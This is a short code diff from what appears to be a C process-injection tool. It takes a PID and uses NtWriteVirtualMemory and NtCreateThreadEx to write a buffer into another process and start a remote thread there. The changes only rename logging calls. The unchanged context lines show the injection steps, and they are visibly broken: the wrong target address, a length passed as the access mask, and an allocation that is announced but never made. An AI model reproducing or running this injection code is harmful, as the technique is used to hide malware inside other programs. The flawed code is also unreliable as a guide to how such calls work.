@@ -55,7 +55,7 @@ int main(int argc, char* argv[]) {
     int s = strlen((char*)Buf);
   if (argc < 2) {
 
-      e(" usage: %s [PID]",argv[0]);
+      w(" usage: %s [PID]",argv[0]);
       return EXIT_FAILURE;
   }
 
@@ -70,10 +70,10 @@ int main(int argc, char* argv[]) {
     // h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40
 
 
-    printf("%s allocating virutal memory...", i);
+i(" allocating... ");
     NtWriteVirtualMemory(h, &Buf, Buf, s, NULL);
     //h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout
-    printf("%s writing virutal memory...", i);
+    i("writing v mem");
     if(NtCreateThreadEx(NULL, s, &Buf, NULL, h,NULL) != 0)
 //0x1FFFFF, IntPtr.Zero, h, memAlloc, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero
 
@@ -82,7 +82,7 @@ int main(int argc, char* argv[]) {
     }
     else {
 
-        e(" unable to create thread :(");
+        w(" unable to create thread :(");
         return EXIT_FAILURE;
     }
 
